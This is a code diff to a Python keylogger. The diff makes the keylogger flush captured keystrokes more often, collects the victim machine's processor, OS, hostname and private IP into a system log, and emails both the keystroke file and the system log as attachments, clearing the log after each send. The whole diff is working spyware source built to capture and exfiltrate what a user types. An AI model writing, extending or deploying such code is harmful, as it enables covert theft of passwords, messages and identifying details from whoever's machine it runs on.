@@ -68,6 +68,10 @@ keysList = []
 # Counts how many keys need to be stored before the list is written.
 count = 0
 
+# --- System Log ---
+
+systemLogFile = "system.txt"
+
 # --- Email Authentication ---
 
 # Authentication capture variables removed before uploading to github.
@@ -107,7 +111,7 @@ def keyPressed(key):
         count = len(keysList)
 
         # If the length of the list goes over a certain value, the list is stored into file and the current working list is wiped clear.
-        if count > 50:
+        if count > 10:
 
             # Cleans the list.
             keyCleaning(keysList)
@@ -115,10 +119,13 @@ def keyPressed(key):
             keysList.clear()
 
             # Adds computer information to the file.
-
+            computerInformation()
 
             # Sends off the information via email.
-            sendEmail(keyFile, filePath + extend + keyFile, email_from)
+            sendEmail(keyFile, filePath + extend, email_from, systemLogFile)
+
+            # Clears out the system information file to avoid duplicating data.
+            clearComputerInformation()
 
     except:
             
@@ -183,7 +190,7 @@ def keyCleaning(keysList):
     return
 
 # ---------------------------------------------------------------
-def sendEmail(fileName, pathToFile, destination):
+def sendEmail(fileName, pathToFile, destination, systemLogFile):
     
     #
     print("email function start")
@@ -202,6 +209,8 @@ def sendEmail(fileName, pathToFile, destination):
     message['To'] = email_to
     message['Subject'] = email_subject
 
+    # --- Attaches the keylogging information ---
+
     # Email body.
     body = "Email Body"
 
@@ -212,7 +221,7 @@ def sendEmail(fileName, pathToFile, destination):
     filename = fileName
 
     # Attachment creation, opens the attachment and reads it in binary, hence 'rb'
-    attachment = open(pathToFile, 'rb')
+    attachment = open(pathToFile + keyFile, 'rb')
 
     # New instance of MIMEBase, named base.
     base = MIMEBase('application', 'octet-stream')
@@ -225,6 +234,35 @@ def sendEmail(fileName, pathToFile, destination):
 
     # Creates the header.
     base.add_header('Content-Disposition', "attachment: filename = %s" % filename)
+
+    # Attaches the instance of base to the instance of message.
+    message.attach(base)
+
+    # --- Attaches the system information ---
+
+    # Email body.
+    body = "Email Body"
+
+    # Enters the "Email body" defined above to the email.
+    message.attach(MIMEText(body, 'plain'))
+
+    # Grabs the file.
+    systemFileName = systemLogFile
+
+    # Attachment creation, opens the attachment and reads it in binary, hence 'rb'
+    attachment = open(pathToFile + systemLogFile, 'rb')
+
+    # New instance of MIMEBase, named base.
+    base = MIMEBase('application', 'octet-stream')
+
+    # Changes the payload into an encoded form.
+    base.set_payload((attachment).read())
+
+    # Encodes into base64.
+    encoders.encode_base64(base)
+
+    # Creates the header.
+    base.add_header('Content-Disposition', "attachment: filename = %s" % systemFileName)
 
     # Attaches the instance of base to the instance of message.
     message.attach(base)
@@ -253,6 +291,30 @@ def sendEmail(fileName, pathToFile, destination):
     print("email sent")
 
 # ---------------------------------------------------------------
+#
+def computerInformation():
+    
+    #
+    print("System information")
+
+    hostname = socket.gethostname()
+    IPAddr = socket.gethostbyname(hostname)
+
+    with open(filePath + extend + systemLogFile, 'a') as systemLog:
+
+        systemLog.write("Processor: " + (platform.processor()) + "\n")
+        systemLog.write("System: " + platform.system() + " " + platform.version() + "\n")
+        systemLog.write("Machine: " + platform.machine() + "\n")
+        systemLog.write("Hostname: " + hostname + "\n")
+        systemLog.write("Private IP Address: " + IPAddr + "\n")
+
+# ---------------------------------------------------------------
+#
+def clearComputerInformation():
+
+    open(filePath + extend + systemLogFile, 'w').close()
+
+# ---------------------------------------------------------------
 # Starts the script.
 def main():
 
@@ -269,4 +331,3 @@ def main():
 if __name__ == "__main__":
 
     main()
-
